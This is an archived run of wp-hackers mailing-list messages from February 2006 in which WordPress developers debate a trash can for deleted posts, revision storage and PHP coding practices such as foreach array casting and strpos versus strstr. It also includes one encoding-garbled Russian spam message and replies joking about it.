(Of course the funny part is that this feature is already there, it's 
just hidden under the "mass edit mode" link, which isn't very intuitive 
to find.)

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From podz at tamba2.org.uk  Tue Feb 14 07:12:10 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb 14 07:13:23 2006
Subject: [wp-hackers] Forum Usefulness (was Data recovery)
In-Reply-To: <43F18146.1080506@mullenweg.com>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com>	<43EF397C.2040600@skippy.net>	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>	<43EF5FB5.8000803@skippy.net>
	<43F18146.1080506@mullenweg.com>
Message-ID: <43F182CA.1050300@tamba2.org.uk>

Matt Mullenweg wrote:

(I'm really going to pick here :) )

> The problem of multiple comments delete

> 
> (Of course the funny part is that this feature is already there, it's
> just hidden under the "mass edit mode" link, which isn't very intuitive
> to find.)
> 

What if they accidentally click one they meant to keep ? Easy enough
when whizzing through a long list ...

P.
From m at mullenweg.com  Tue Feb 14 07:16:59 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Feb 14 07:19:25 2006
Subject: [wp-hackers] post_status == previous
In-Reply-To: <43F0B7E1.40901@jrm.cc>
References: <43EE5465.1090502@tamba2.org.uk><ebe43d680602111337l1c8f285aw@mail.gmail.com><20060211214445.GK1070@kimmo.suominen.com><007501c62f57$9754b8d0$6e01a8c0@sixfour><ebe43d680602120211g681b3a23t@mail.gmail.com><F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><001801c62feb$42812de0$6e01a8c0@sixfour>	<008001c62ff3$6e2d51a0$6402a8c0@DELL8600>	<003301c62ff5$ac4b5930$6e01a8c0@sixfour>
	<43F0B7E1.40901@jrm.cc>
Message-ID: <43F183EB.5000409@mullenweg.com>

Jeff Minard wrote:
> Ahem, as long as we're at it...
> 
>   post_status = "previous"
> 
> Sort those old ones by last mod date (if we keep that...) and away you 
> go. Making a diff on the fly to show changes would work. Storing the 
> difference would work to I suppose, but seems a little odd to me -- I'd 
> rather have the actual content in the "previous" version.

I don't recall if it's been pointed out here before, but:

http://svn.wp-plugins.org/blicki/trunk/

Only works on trunk. Opted for a separate table for revision history, 
for a lot of reasons. Consider throwing some patches Ryan's way, he's 
feeling under the weather.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From m at mullenweg.com  Tue Feb 14 07:21:16 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Feb 14 07:23:42 2006
Subject: [wp-hackers] Forum Usefulness (was Data recovery)
In-Reply-To: <43F182CA.1050300@tamba2.org.uk>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com>	<43EF397C.2040600@skippy.net>	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>	<43EF5FB5.8000803@skippy.net>	<43F18146.1080506@mullenweg.com>
	<43F182CA.1050300@tamba2.org.uk>
Message-ID: <43F184EC.3040803@mullenweg.com>

Podz wrote:
>> (Of course the funny part is that this feature is already there, it's
>> just hidden under the "mass edit mode" link, which isn't very intuitive
>> to find.)
> 
> What if they accidentally click one they meant to keep ? Easy enough
> when whizzing through a long list ...

True! Maybe it's good that functionality is hard to find. ;)

But we can't protect everyone all the time. *What if* Godzilla destroys 
their server and all the backups?

I imagine life would go on.

There is a spectrum between being not caring, being a scolding parent, 
and acting like a tragic superhero tilting at windmills. Let's try to 
stay moderate.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From podz at tamba2.org.uk  Tue Feb 14 07:30:56 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Feb 14 07:32:12 2006
Subject: [wp-hackers] Forum Usefulness (was Data recovery)
In-Reply-To: <43F184EC.3040803@mullenweg.com>
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com>	<43EF397C.2040600@skippy.net>	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>	<43EF5FB5.8000803@skippy.net>	<43F18146.1080506@mullenweg.com>	<43F182CA.1050300@tamba2.org.uk>
	<43F184EC.3040803@mullenweg.com>
Message-ID: <43F18730.1050700@tamba2.org.uk>

Matt Mullenweg wrote:
> Podz wrote:
>>> (Of course the funny part is that this feature is already there, it's
>>> just hidden under the "mass edit mode" link, which isn't very intuitive
>>> to find.)
>>
>> What if they accidentally click one they meant to keep ? Easy enough
>> when whizzing through a long list ...
> 
> True! Maybe it's good that functionality is hard to find. ;)
> 
> But we can't protect everyone all the time. *What if* Godzilla destroys
> their server and all the backups?
> 
> I imagine life would go on.
> 
> There is a spectrum between being not caring, being a scolding parent,
> and acting like a tragic superhero tilting at windmills. Let's try to
> stay moderate.
> 

I put a question that will be asked of WP.
My take is that for the effort involved the gains are more.
But anyway, I asked, there is an answer and that's fine.
I totally disagree.

P.

From wpdevelop at ozgreg.com  Tue Feb 14 07:48:33 2006
From: wpdevelop at ozgreg.com (WPG2)
Date: Tue Feb 14 07:50:17 2006
Subject: [wp-hackers] Seminars
Message-ID: <1139903313.m2f.11742@wpg2.ozgreg.com>

?????????? ???????? ?????????? ???????? ?????????????. ?????????? ???????? 2006 ? ??????. ?????????? ???????? ???????????? ???????? ??????????. ?????????? ???????? ????????????? 2007 ?????????????. (http://trsem.chat.ru/index.html)
?????????? ???????? ??????? 2006 ??????. ?????????? ???????? ???????? ?????????? ???????. ?????????? ???????? ???????? ?????????? ??????????????. ?????????? ???????? ?????????? 2006 ????????. (http://trsem.chat.ru/main1.html)
?????????? ???????? ?????? ????????????? ??????????. ?????????? ???????? ???? ???????? ??????????. ?????????? ???????? ?????????? ??????? ?????. ?????????? ???????? ???????? ????????????? 2006. (http://trsem.chat.ru/main2.html)
?????????? ???????? ???????????? ???? ?????. ?????????? ???????? ?????????? ????????? ???????????. ?????????? ???????? ?????????? ??????? ??????. ?????????? ???????? 2006 ???????? 2006. (http://trsem.chat.ru/main3.html)
?????????? ???????? ? ?????? ????????. ?????????? ???????? ??????? ?????????? ???????. ?????????? ???????? ???????? ??????? ????????. ?????????? ???????? ??????? ????? ??????. (http://trsem.chat.ru/main4.html)
?????????? ???????? ???????? ?????? 2006. ?????????? ???????? ???????? ? 2006. ?????????? ???????? ????????????? 2006 ?????. ?????????? ???????? ?????????? ??????????? ???????????. (http://trsem.chat.ru/main5.html)
?????????? ???????? ?????? 2006 ???????. ?????????? ???????? ????????? ?????????????? 2006. ?????????? ???????? ????????? ??????? ??????. ?????????? ???????? ????????????? 2006 ????. (http://trsem.chat.ru/main6.html)
?????????? ???????? 2006 ?????????? ?????????. ?????????? ???????? ??????? ?????????? 2007. (http://trsem.chat.ru/main7.html)


-------------------- m2f --------------------

WPG2 Forums (http://wpg2.ozgreg.com/forums/)

-------------------- m2f --------------------


From robs_wph at rs-tc.com  Tue Feb 14 11:38:08 2006
From: robs_wph at rs-tc.com (Rob Schumann)
Date: Tue Feb 14 11:40:05 2006
Subject: [wp-hackers] Disabling 'Manage' menu in admin
Message-ID: <r02010500-1039-5F3C971E9D4E11DA93A3003065B8E592@[192.168.1.3]>

Thanks Owen,

Sorry for the delay in replying... sent from the wrong email
address first time and got filtered out

On 09-02-2006at 22:30, ringmaster@midnightcircus.com (Owen
Winkler) wrote:

  >  http://wordpress.org/support/topic/54017#post-319165

With a small change I've vanished the 'Manage' menu tab
entirely.

Much appreciated.

Best regards

Rob
From nuclearmoose at gmail.com  Tue Feb 14 15:51:52 2006
From: nuclearmoose at gmail.com (Craig)
Date: Tue Feb 14 15:53:42 2006
Subject: [wp-hackers] Seminars
In-Reply-To: <1139903313.m2f.11742@wpg2.ozgreg.com>
References: <1139903313.m2f.11742@wpg2.ozgreg.com>
Message-ID: <5aa3aa0602140751s33e1774bn5e6ef579381b3842@mail.gmail.com>

Nice...mailing list spam now? Is this ever going to end? Sorry, dumb
question...go back to your computers! :)
Craig.


On 2/14/06, WPG2 <wpdevelop@ozgreg.com> wrote:
>
> ?????????? ???????? ....<snip>
>
From lists at abhaykumar.net  Tue Feb 14 16:09:40 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Tue Feb 14 16:11:25 2006
Subject: [wp-hackers] Seminars
In-Reply-To: <5aa3aa0602140751s33e1774bn5e6ef579381b3842@mail.gmail.com>
References: <1139903313.m2f.11742@wpg2.ozgreg.com>
	<5aa3aa0602140751s33e1774bn5e6ef579381b3842@mail.gmail.com>
Message-ID: <512061b90602140809m773bd29fhc1b7dda242c63c6d@mail.gmail.com>

> Nice...mailing list spam now? Is this ever going to end? Sorry, dumb
> question...go back to your computers! :)
my russian is rusty, are you sure it's spam?

(kidding)

kill the spammer.

-Abhay

--
Abhay Kumar
http://abhaykumar.net/
From davebytes at comcast.net  Tue Feb 14 16:15:38 2006
From: davebytes at comcast.net (David Chait)
Date: Tue Feb 14 16:18:30 2006
Subject: [wp-hackers] Data recovery (post_status?)
References: <43EE5465.1090502@tamba2.org.uk>	<ebe43d680602111337l1c8f285aw@mail.gmail.com>	<20060211214445.GK1070@kimmo.suominen.com>	<007501c62f57$9754b8d0$6e01a8c0@sixfour>	<ebe43d680602120211g681b3a23t@mail.gmail.com>	<F1FD6659-70EC-4E6C-91F9-D2CC48DF1089@txfx.net><ebe43d680602120426u20523b8m@mail.gmail.com><43EF397C.2040600@skippy.net>	<001301c62fea$b1ef71b0$6e01a8c0@sixfour>	<006001c62ff2$45cece10$6402a8c0@DELL8600><43F17D6D.3000303@mullenweg.com>
	<43F17FCF.60803@tamba2.org.uk>
Message-ID: <004801c63181$e544ee80$6e01a8c0@sixfour>

I think this thread had already come to a conclusion, which was that the 
'trash can' concept is well understood by users, and a useful/positive 
concept to bring into WP.  We can easily do post_status=='trash' + post_meta 
(timestamp and previous status).  My guess is without adding any further 
work we can put a comment in the 'trash' with comment_approved=='trash'. 
(Obv, both post_status and comment_approved need to be varchars, again as 
was already discussed...).

I'd obviously make the 'trash can' or 'recycle bin' panel only available to 
highest-level admins (so that while an abusive lower-level user might have 
normal 'delete' privs, the 'empty_trash' priv is reserved... ;) ).

-d

----- Original Message ----- 
From: "Podz" <podz@tamba2.org.uk>
To: <wp-hackers@lists.automattic.com>
Sent: Tuesday, February 14, 2006 1:59 AM
Subject: Re: [wp-hackers] Data recovery (post_status?)


| Matt Mullenweg wrote:
|
| > In WP most "delete" buttons turn red (first flag) and have a popup
| > warning that isn't used anywhere else in the program (flag two). I think
| > this is sufficient. Sometimes users really want delete.
|
| And sometimes it's an accident or in the case of a multi-author blog a
| disgruntled user.
| Just posts and comments ?
|
| P. 

From jason at zenenet.com  Tue Feb 14 16:21:09 2006
From: jason at zenenet.com (Jason S.)
Date: Tue Feb 14 16:22:52 2006
Subject: [wp-hackers] Seminars
In-Reply-To: <5aa3aa0602140751s33e1774bn5e6ef579381b3842@mail.gmail.com>
References: <1139903313.m2f.11742@wpg2.ozgreg.com>
	<5aa3aa0602140751s33e1774bn5e6ef579381b3842@mail.gmail.com>
Message-ID: <43F20375.2050903@zenenet.com>

Craig wrote:
> Nice...mailing list spam now? Is this ever going to end? Sorry, dumb
> question...go back to your computers! :)
> Craig.
> 
> On 2/14/06, WPG2 <wpdevelop@ozgreg.com> wrote:
>> ?????????? ???????? ....<snip>

It will end as soon as Matt modifies Akismet to become big brother and
take over the anti-spam world.
That was the intention wasn't it?

Where am I again?  Conspiracy Cahoots Anonymous?
Aw drat...
From mark.wordpress at txfx.net  Wed Feb 15 00:19:38 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Feb 15 00:21:30 2006
Subject: [wp-hackers] PHP Coding Practices
Message-ID: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>

I'd like to get some group feedback on this:

Issue #1

WP currently uses strstr() in many places just to establish basic  
"this string exists in that string" functionality.  According to  
http://php.net/strstr, "Note:  If you only want to determine if a  
particular needle  occurs within haystack, use the faster and less  
memory intensive function strpos() instead."

And, of course, when using strpos(), you have to be careful to check  
it with === or !== against boolean false.  if ( strpos($haystack,  
$needle) !== false ) { // $needle exists in $haystack }

I made this change in one of my recent "Massive Code Cleanups" but  
would like to know if it would be worth changing all other instances  
for speed/consistency/code-is-poetry.


Issue #2

We've gotten into trouble several times with running foreach() on  
something that might not be an array.  We currently are using a lot  
of "if ( !empty($things) )" checks to prevent that.  I'm rather a fan  
of casting to array when using foreach:

foreach ( (array) $things as $thing ) {

If $things is null or false or whatever, it just becomes an empty  
array, and the foreach block gets skipped... the desired behavior.   
It's less code, and it brings all foreach() loop up a level in terms  
of code indentation, which increases readability.

--
Mark Jaquith
http://txfx.net/


From wp at ebroder.net  Wed Feb 15 00:45:10 2006
From: wp at ebroder.net (Evan Broder)
Date: Wed Feb 15 00:46:37 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
Message-ID: <43F27996.5040604@ebroder.net>

Mark Jaquith wrote:
> I'd like to get some group feedback on this:
>
> Issue #1
>
> WP currently uses strstr() in many places just to establish basic 
> "this string exists in that string" functionality.  According to 
> http://php.net/strstr, "Note:  If you only want to determine if a 
> particular needle  occurs within haystack, use the faster and less 
> memory intensive function strpos() instead."
>
> And, of course, when using strpos(), you have to be careful to check 
> it with === or !== against boolean false.  if ( strpos($haystack, 
> $needle) !== false ) { // $needle exists in $haystack }
>
> I made this change in one of my recent "Massive Code Cleanups" but 
> would like to know if it would be worth changing all other instances 
> for speed/consistency/code-is-poetry.
>
>
> Issue #2
>
> We've gotten into trouble several times with running foreach() on 
> something that might not be an array.  We currently are using a lot of 
> "if ( !empty($things) )" checks to prevent that.  I'm rather a fan of 
> casting to array when using foreach:
>
> foreach ( (array) $things as $thing ) {
>
> If $things is null or false or whatever, it just becomes an empty 
> array, and the foreach block gets skipped... the desired behavior.  
> It's less code, and it brings all foreach() loop up a level in terms 
> of code indentation, which increases readability.
>
> -- 
> Mark Jaquith
> http://txfx.net/
+1 on both counts. Adding those recommendations to the Codex coding 
practices page would be nice as well, at least the second one---I had 
never thought of casting the variables. My code has always used the if 
method.

- Evan
From skeltoac at gmail.com  Wed Feb 15 00:46:44 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Wed Feb 15 00:48:30 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
Message-ID: <e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>

On 2/14/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> I'd like to get some group feedback on this:
>
> Issue #1

Worthwhile to use strpos !== false in all new and updated code (I
recently started doing that, too) but I wouldn't sweat the old stuff
unless you're really bored.

> Issue #2
> foreach ( (array) $things as $thing ) {

That's awesome except you can also foreach an object. Be careful about that.

Andy
From mark.wordpress at txfx.net  Wed Feb 15 00:53:11 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Feb 15 00:54:58 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
Message-ID: <A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>

On Feb 14, 2006, at 7:46 PM, Andy Skelton wrote:

> Worthwhile to use strpos !== false in all new and updated code (I
> recently started doing that, too) but I wouldn't sweat the old stuff
> unless you're really bored.

I am, from time to time (bored, that is).  I've submitted patches  
that purely fix spaces => tabs and fix indentation issues. :-)

>> Issue #2
>> foreach ( (array) $things as $thing ) {
>
> That's awesome except you can also foreach an object. Be careful  
> about that.

You can only foreach() objects in PHP5.  I don't see WordPress  
dropping PHP4 support anytime soon, so I think we're safe there.

--
Mark Jaquith
http://txfx.net/


From grijalva at gmail.com  Wed Feb 15 01:40:00 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Wed Feb 15 01:41:45 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
	<A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
Message-ID: <a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>

That's not really true.  I'm pretty sure you can foreach a PHP4 array.  It's
been a while since I coded in 4, but I think it returns the objects
properties.  In either case, it seems foolish to include code that will
become a problem in the future, no matter how remote.  Plus, people who are
running on 5 and want to take advantage of it should be able to.  Backwards
compatibility is great, but forwards compatibility is a no brainer.

On 2/14/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
>
> On Feb 14, 2006, at 7:46 PM, Andy Skelton wrote:
>
> > Worthwhile to use strpos !== false in all new and updated code (I
> > recently started doing that, too) but I wouldn't sweat the old stuff
> > unless you're really bored.
>
> I am, from time to time (bored, that is).  I've submitted patches
> that purely fix spaces => tabs and fix indentation issues. :-)
>
> >> Issue #2
> >> foreach ( (array) $things as $thing ) {
> >
> > That's awesome except you can also foreach an object. Be careful
> > about that.
>
> You can only foreach() objects in PHP5.  I don't see WordPress
> dropping PHP4 support anytime soon, so I think we're safe there.
>
> --
> Mark Jaquith
> http://txfx.net/
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From false.hopes at gmail.com  Wed Feb 15 01:56:06 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Feb 15 01:57:55 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
	<A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
	<a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>
Message-ID: <a491f91d0602141756q1428e417r39f9599520535b9d@mail.gmail.com>

On 2/15/06, Dave Grijalva <grijalva@gmail.com> wrote:
> That's not really true.  I'm pretty sure you can foreach a PHP4 array.

Where did this come from? Nobody was debating that. In the event that
you really meant object, you are wrong, as per http://php.net/foreach,
object iteration was added in PHP5.

> <snip>  In either case, it seems foolish to include code that will
> become a problem in the future, no matter how remote.  Plus, people who are
> running on 5 and want to take advantage of it should be able to.  Backwards
> compatibility is great, but forwards compatibility is a no brainer.

I am in no way seeing how this would break forwards compatability.
Anyone who wants to submit a patch that iterates over an object can
easily do so, leaving out the typecast (maybe even making a comment
that it is an object so that nobody else comes along and tries to
typecast it), and continue along with their life.

We cannot change the behavior of foreach to force the typecast, but we
can however typecast wherever we know we are expecting an array.

--
--Robert Deaton
http://somethingunpredictable.com
From grijalva at gmail.com  Wed Feb 15 02:14:16 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Wed Feb 15 02:16:02 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <a491f91d0602141756q1428e417r39f9599520535b9d@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
	<A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
	<a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>
	<a491f91d0602141756q1428e417r39f9599520535b9d@mail.gmail.com>
Message-ID: <a0159cd30602141814p5d638362h662dfa0c20152ce5@mail.gmail.com>

actually, it is in php4:

:~ dave$ php4
<?php
class test {
var $a;
var $b;
}

$test = new test();
$test->a = 'abc';
$test->b = 'hey, you';

foreach($test as $key => $val){
 echo "$key: $val";
echo "\n";
}
?>
------  output ------
a: abc
b: hey, you

it may not be documented, but it's there.

yes, this doesn't break iterating over an object, but it does break creating
an object that can be iterated elsewhere.  in PHP5, an iteratable object
should behave properly when used anywhere an array is expected.  typecasting
would break this compatibility all over the wordpress core

-dave

On 2/14/06, Robert Deaton <false.hopes@gmail.com> wrote:
>
> On 2/15/06, Dave Grijalva <grijalva@gmail.com> wrote:
> > That's not really true.  I'm pretty sure you can foreach a PHP4 array.
>
> Where did this come from? Nobody was debating that. In the event that
> you really meant object, you are wrong, as per http://php.net/foreach,
> object iteration was added in PHP5.
>
> > <snip>  In either case, it seems foolish to include code that will
> > become a problem in the future, no matter how remote.  Plus, people who
> are
> > running on 5 and want to take advantage of it should be able
> to.  Backwards
> > compatibility is great, but forwards compatibility is a no brainer.
>
> I am in no way seeing how this would break forwards compatability.
> Anyone who wants to submit a patch that iterates over an object can
> easily do so, leaving out the typecast (maybe even making a comment
> that it is an object so that nobody else comes along and tries to
> typecast it), and continue along with their life.
>
> We cannot change the behavior of foreach to force the typecast, but we
> can however typecast wherever we know we are expecting an array.
>
> --
> --Robert Deaton
> http://somethingunpredictable.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
From mark.wordpress at txfx.net  Wed Feb 15 04:19:39 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Feb 15 04:21:42 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <a0159cd30602141814p5d638362h662dfa0c20152ce5@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
	<A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
	<a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>
	<a491f91d0602141756q1428e417r39f9599520535b9d@mail.gmail.com>
	<a0159cd30602141814p5d638362h662dfa0c20152ce5@mail.gmail.com>
Message-ID: <1090F342-EB9C-421C-97E2-FA6214788B89@txfx.net>

On Feb 14, 2006, at 9:14 PM, Dave Grijalva wrote:

> it may not be documented, but it's there.

I stand corrected.  Interesting that it's incorrectly documented.

> yes, this doesn't break iterating over an object, but it does break  
> creating
> an object that can be iterated elsewhere.  in PHP5, an iteratable  
> object
> should behave properly when used anywhere an array is expected.   
> typecasting
> would break this compatibility all over the wordpress core

We're not going to cast objects to array.  So there's no problem.   
We're not running foreach() loops on objects... only on arrays or  
queries that normally return arrays, but may return false (no  
results) instead.

ezSQL isn't going to start returning objects where it used to return  
arrays, so there is no issue of compatibility.
--
Mark Jaquith
http://txfx.net/


From false.hopes at gmail.com  Wed Feb 15 06:34:17 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Feb 15 06:36:04 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <a0159cd30602141814p5d638362h662dfa0c20152ce5@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
	<A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
	<a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>
	<a491f91d0602141756q1428e417r39f9599520535b9d@mail.gmail.com>
	<a0159cd30602141814p5d638362h662dfa0c20152ce5@mail.gmail.com>
Message-ID: <a491f91d0602142234k3a3e6ed1n774816772a769ebf@mail.gmail.com>

On 2/15/06, Dave Grijalva <grijalva@gmail.com> wrote:
> actually, it is in php4:
>
> :~ dave$ php4
> <?php
> class test {
> var $a;
> var $b;
> }
>
> $test = new test();
> $test->a = 'abc';
> $test->b = 'hey, you';
>
> foreach($test as $key => $val){
>  echo "$key: $val";
> echo "\n";
> }
> ?>
> ------  output ------
> a: abc
> b: hey, you
>
> it may not be documented, but it's there.

Actually, that's a typecast. Try using an explicit one in the code,
you'll notice that it runs the same.

lappy ~ # php
<?php
class test {
var $a;
var $b;
}

$test = new test();
$test->a = 'abc';
$test->b = 'hey, you';

var_dump((array) $test);
?>

array(2) {
  ["a"]=>
  string(3) "abc"
  ["b"]=>
  string(8) "hey, you"
}

Mark, you were right, and the documentation is correct.

--
--Robert Deaton
http://somethingunpredictable.com
From skeltoac at gmail.com  Wed Feb 15 06:42:05 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Wed Feb 15 06:43:50 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <a491f91d0602142234k3a3e6ed1n774816772a769ebf@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
	<A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
	<a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>
	<a491f91d0602141756q1428e417r39f9599520535b9d@mail.gmail.com>
	<a0159cd30602141814p5d638362h662dfa0c20152ce5@mail.gmail.com>
	<a491f91d0602142234k3a3e6ed1n774816772a769ebf@mail.gmail.com>
Message-ID: <e6ec604d0602142242k2bc59731m8e6449db7de93679@mail.gmail.com>

On 2/15/06, Robert Deaton <false.hopes@gmail.com> wrote:
> Actually, that's a typecast. Try using an explicit one in the code,
> you'll notice that it runs the same.

So... it doesn't hurt the object to cast it as an array in a foreach.
I shoulda known better because there's no assignment operator. My bad,
I retract my statement.

Andy
From dmhouse at gmail.com  Wed Feb 15 11:28:36 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb 15 11:30:24 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <a491f91d0602142234k3a3e6ed1n774816772a769ebf@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
	<A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
	<a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>
	<a491f91d0602141756q1428e417r39f9599520535b9d@mail.gmail.com>
	<a0159cd30602141814p5d638362h662dfa0c20152ce5@mail.gmail.com>
	<a491f91d0602142234k3a3e6ed1n774816772a769ebf@mail.gmail.com>
Message-ID: <ebe43d680602150328n19c9c27cv@mail.gmail.com>

On 15/02/06, Robert Deaton <false.hopes@gmail.com> wrote:
> Actually, that's a typecast. Try using an explicit one in the code,
> you'll notice that it runs the same.

So for all extents and purposes you can iterate an object in PHP4.

I do agree however that doing so is harmless.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From podz at tamba2.org.uk  Wed Feb 15 11:41:18 2006
From: podz at tamba2.org.uk (Podz)
Date: Wed Feb 15 11:42:31 2006
Subject: [wp-hackers] The alt tag
Message-ID: <43F3135E.9040407@tamba2.org.uk>

http://wordpress.org/support/topic/61228?replies=2#post-326996
Poster wants to use images as links. She can't see a way to add alt or
title attributes to the images and the lack of an alt tag means that WP
is outputting invalid xhtml.
Or are we both missing something ?

Having had a look at that page (mine is much abbreviated) in 2.0.1, it
would seem in need of an overhaul as I'm sure that's not changed in a
very long time.

P.
From mark.wordpress at txfx.net  Wed Feb 15 12:30:03 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Feb 15 12:31:50 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
Message-ID: <7235C637-F6D4-4EB0-9A7D-905F5A79D797@txfx.net>

On Feb 14, 2006, at 7:19 PM, Mark Jaquith wrote:

> WP currently uses strstr() in many places just to establish basic  
> "this string exists in that string" functionality.  According to  
> http://php.net/strstr, "Note:  If you only want to determine if a  
> particular needle  occurs within haystack, use the faster and less  
> memory intensive function strpos() instead."

You know what?  I just ran a bunch of speed tests.  I used small  
haystacks and big haystacks.  I ran strstr($haystack, $needle)  
against strpos($haystack, $needle) !== false (as well as the opposite  
versions with a million iterations each.  strstr() is faster by  
anywhere from 5 to 20%.  Plus, it looks nicer in the code.

So now this is just about casting to array for foreach() rather than  
testing with !empty().  Any objections?
--
Mark Jaquith
http://txfx.net/


